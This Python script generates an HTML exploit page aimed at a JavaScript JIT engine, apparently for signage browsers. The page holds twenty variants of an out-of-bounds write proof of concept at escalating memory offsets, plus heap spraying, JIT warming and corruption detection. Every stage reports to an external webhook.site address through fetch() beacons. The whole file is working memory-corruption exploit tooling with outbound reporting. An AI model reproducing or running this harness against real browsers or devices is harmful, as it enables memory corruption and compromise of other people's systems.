#!/usr/bin/env python3
"""Generate esc5.html: N poc-function variants, each with compile-time const offset,
selected per-load by localStorage index. Sync execution only (signage blocks timers)."""
import sys

SINK = 'https://webhook.site/d14b9308-3eca-44e5-8e74-a88903035ea0'
NVARS = 20
STEP = 0x20000000      # 512M units -> 2GB byte steps
BASE = 0x100000000     # 16GB offset floor

POC = """
function poc%d(a) {
  var oob_array = new Array(5);
  oob_array[0] = 0x500;
  let just_a_variable = fake[0];
  let another_variable3 = fake[7];
  if(a %% 7 == 0)
    another_variable3 = %s;
  another_variable3 = Math.max(another_variable3,tahir);
  another_variable3 = another_variable3 >>> 0;
  var index = fake[3];
  var for_phi_modes = fake[6];
  let c = fake[1];
  for(var i =0;i<10;i++) {
    if( a %% 3 == 0){ just_a_variable = c; }
    if( a %% 37 == 0) { just_a_variable = fake[2]; }
    if( a %% 11 == 0){ just_a_variable = fake[8]; }
    if( a %% 17 == 0){ just_a_variable = fake[5]; }
    if( a %% 19 == 0){ just_a_variable = fake[4]; }
    if( a %% 7 == 0 && i>=5){
      for_phi_modes = just_a_variable;
      just_a_variable = another_variable3;
    }
    if(i>=6){
      for(let j=0;j<5;j++){
        if(a %% 5 == 0) {
          index = for_phi_modes;
          oob_array[index] = 0x500;
        }
      }
    }
    for_phi_modes = c;
    c = just_a_variable;
  }
  return [index,BigInt(just_a_variable)];
}
"""

html = ["<html><body><script>",
        "const SINK = '%s';" % SINK,
        """function beacon(t, v){
  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), {mode:'no-cors'}); } catch(e) {}
}
var N = 0;
try { N = parseInt(localStorage.getItem('esc5_i') || '0', 10); } catch(e) {}
beacon('load', 'i=' + N);
var arrx = new Array(150);
arrx[0] = 1.1;
var fake = new Uint32Array(10);
fake[0]= 1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
var tahir = 1;
"""]

for i in range(NVARS):
    const = '0x%x' % (BASE + i * STEP)
    html.append(POC % (i, const))

html.append("""
// spray
var NB = 8, SZB = 32 * 1024 * 1024;
var bufs = [];
try { for (var b = 0; b < NB; b++) { var u = new Uint32Array(SZB / 4); u.fill(0xABABABAB); bufs.push(u); } } catch(e) { beacon('spray-exc', String(e).slice(0,60)); }

function warm(fn) {
  var w = 0;
  for (var i2 = 2; w < 60000; i2++) {
    var a = i2 % 700;
    if (a % 5 == 0 && a % 7 == 0) continue;
    fn(a); w++;
  }
}
var FNS = [""")

html.append(', '.join('poc%d' % i for i in range(NVARS)))
html.append("""];

// warm only the current variant (crash before others warmed is fine)
warm(FNS[N]);
beacon('shot', 'i=' + N + ' off=0x' + (0x%x + N * 0x%x).toString(16));
try { FNS[N](35); } catch(e) { beacon('exc', String(e).slice(0,60)); }
beacon('survived', 'i=' + N);
try { localStorage.setItem('esc5_i', String(N + 1)); } catch(e) {}
for (var b = 0; b < bufs.length; b++) {
  var u = bufs[b];
  for (var w2 = 0; w2 < u.length; w2++) {
    if (u[w2] !== 0xABABABAB) { beacon('HIT', 'buf=' + b + ' w=' + w2 + ' v=0x' + (u[w2]>>>0).toString(16)); break; }
  }
}
</script></body></html>""" % (BASE, STEP))

sys.stdout.write('\n'.join(html))
